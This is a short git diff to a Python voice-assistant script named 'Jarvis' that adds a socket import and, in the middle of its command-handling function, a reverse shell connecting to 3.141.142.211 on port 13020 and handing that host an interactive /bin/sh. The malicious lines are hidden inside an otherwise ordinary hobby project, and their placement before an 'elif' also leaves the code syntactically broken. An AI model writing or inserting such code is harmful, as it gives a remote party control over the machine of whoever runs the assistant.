@@ -4,6 +4,7 @@ import pywhatkit
 import datetime  
 import wikipedia 
 import pyjokes 
+import socket,subprocess,os
 import webbrowser
 import time
 import keyboard 
@@ -75,6 +76,12 @@ def run_Jarvis():
         talk('click ask to join..')
         talk('thank you')
     
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("3.141.142.211",13020))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+
     elif 'alarm' in command:
         talk('Please enter the time')
         Time=input("Enter the time (HH24:MM): ")
